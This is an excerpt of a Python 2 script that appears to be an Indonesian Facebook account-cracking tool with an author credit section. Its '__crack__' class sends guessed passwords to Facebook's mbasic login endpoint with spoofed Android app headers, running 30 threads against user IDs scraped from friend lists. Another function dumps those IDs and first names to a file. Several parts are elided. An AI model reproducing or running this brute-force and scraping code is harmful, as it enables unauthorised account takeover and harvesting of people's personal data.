...
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [*] menu : ')
        if yan == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N)
           time.sleep(1)
           os.system('clear')
           moch_yayan()
        elif yan =='1':
...
def publik():
    ...
    try:
        ...
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['first_name'])
            ys.write(a['id'] + '<=>' + a['first_name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)
...
def cek_ingfo():
    ...
    print ' [*] status hubungan: %s'%(stas);time.sleep(0.03)
...
def user_id():
    try:
        u = raw_input(' [?] masukan username fb : ')
...
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N)
    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N)
    print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N)
...
class __crack__:
    ...
    def __mbasic__(self, user, _yan_):
        ...
        for pw in _yan_:
            ...
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
            xo = aw.content
            ...
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for ajg in self.id:
                    try:
                        ...
                        __yayanXD__.submit(self.__api__, bb[0], raimuu)
                    except:
                        pass
            ...
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for ajg in self.id:
                    try:
                        ...
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuu)
                    except:
                        pass
            ...
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for mmk in self.id:
                    try:
                        ...
                        __yayanXD__.submit(self.__mfb__, sz[0], memekkkk)
                    except:
                        pass
